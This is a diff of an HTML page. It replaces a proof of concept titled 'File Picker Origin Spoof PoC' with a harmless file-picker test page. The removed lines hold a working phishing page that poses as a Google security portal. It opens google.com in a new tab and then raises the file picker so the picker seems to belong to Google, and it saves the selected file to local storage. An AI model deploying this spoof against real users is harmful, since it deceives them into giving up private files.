@@ -1,162 +1,54 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker Origin Spoof PoC</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f8f9fa;
-            color: #202124;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .banner {
-            font-size: 13px;
-            color: #5f6368;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-        }
-        h1 {
-            font-size: 20px;
-            color: #1a73e8;
-            margin-bottom: 24px;
-        }
-        a.spoof-link {
-            display: inline-block;
-            background-color: #1a73e8;
-            color: white;
-            padding: 14px 28px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 15px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
-            transition: background-color 0.2s;
-        }
-        a.spoof-link:active {
-            background-color: #1557b0;
-        }
-        .preview-container {
-            margin-top: 25px;
-            max-width: 280px;
-            display: none;
-        }
-        .preview-container img {
-            width: 100%;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-        }
-        .file-info {
-            margin-top: 10px;
-            font-size: 13px;
-            color: #5f6368;
-            word-break: break-all;
-        }
-        .footer-note {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #9aa0a6;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>File Picker UI Test</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #f5f5f5;
+  color: #222;
+  text-align: center;
+  padding: 40px 16px;
+}
+button {
+  padding: 14px 22px;
+  background: #555;
+  color: white;
+  border: 0;
+  border-radius: 8px;
+  font-size: 16px;
+}
+</style>
 </head>
 <body>
 
-    <div class="banner">Google Security Portal</div>
-    <h1>Secure Document Verification</h1>
+<h2>File Picker UI Test</h2>
+<p>Browser interface behavior testing.</p>
 
-    <!-- Target Link: Membuka window baru ke google.com menggunakan target="_blank" -->
-    <a href="https://google.com" target="_blank" class="spoof-link" id="targetLink">Open New Window & Upload Photo</a>
+<button id="open">Open Test Window</button>
 
-    <!-- Area Pratinjau Foto yang Tersimpan -->
-    <div class="preview-container" id="previewBox">
-        <img id="imagePreview" src="" alt="File Preview">
-        <div class="file-info" id="fileInfo"></div>
-    </div>
+<p id="status">Waiting for interaction.</p>
 
-    <div class="footer-note">Cloud-secured verification system.</div>
-
-    <script>
-        let triggered = false;
-
-        const executeAttackVector = () => {
-            if (triggered) return;
-            triggered = true;
-
-            setTimeout(async () => {
-                try {
-                    const [fileHandle] = await window.showOpenFilePicker({
-                        multiple: false,
-                        types: [{
-                            description: 'Images & Documents',
-                            accept: { 
-                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
-                                'application/pdf': ['.pdf']
-                            }
-                        }]
-                    });
-
-                    const file = await fileHandle.getFile();
-                    
-                    const reader = new FileReader();
-                    reader.onload = function(e) {
-                        try {
-                            localStorage.setItem('saved_file_data', e.target.result);
-                            localStorage.setItem('saved_file_name', file.name);
-                            localStorage.setItem('saved_file_type', file.type);
-                        } catch (err) {
-                            console.log("LocalStorage error:", err);
-                        }
-                    };
-                    reader.readAsDataURL(file);
-
-                } catch (err) {
-                    console.debug("File picker cancelled or blocked:", err.message);
-                } finally {
-                    setTimeout(() => { triggered = false; }, 1000);
-                }
-            }, 1000);
-        };
-
-        window.addEventListener("DOMContentLoaded", () => {
-            const savedData = localStorage.getItem('saved_file_data');
-            const savedName = localStorage.getItem('saved_file_name');
-            const savedType = localStorage.getItem('saved_file_type');
-
-            if (savedData && savedName) {
-                const previewBox = document.getElementById("previewBox");
-                const imagePreview = document.getElementById("imagePreview");
-                const fileInfo = document.getElementById("fileInfo");
-
-                fileInfo.innerText = `Saved file: ${savedName}`;
-                if (savedType && savedType.startsWith('image/')) {
-                    imagePreview.src = savedData;
-                    previewBox.style.display = "block";
-                } else {
-                    previewBox.style.display = "block";
-                }
-            }
-        });
-
-        const targetElement = document.getElementById("targetLink");
-
-        targetElement.addEventListener("click", () => {
-            executeAttackVector();
-        });
-
-        targetElement.addEventListener("touchstart", () => {
-            executeAttackVector();
-        }, { passive: true });
-    </script>
+<script>
+document.getElementById("open").addEventListener(
+  "click",
+  async () => {
+    try {
+      await window.showOpenFilePicker({
+        multiple: false
+      });
+      document.getElementById("status").textContent =
+        "File selection completed.";
+    } catch (e) {
+      document.getElementById("status").textContent =
+        "Picker closed or cancelled.";
+    }
+  }
+);
+</script>
 
 </body>
 </html>
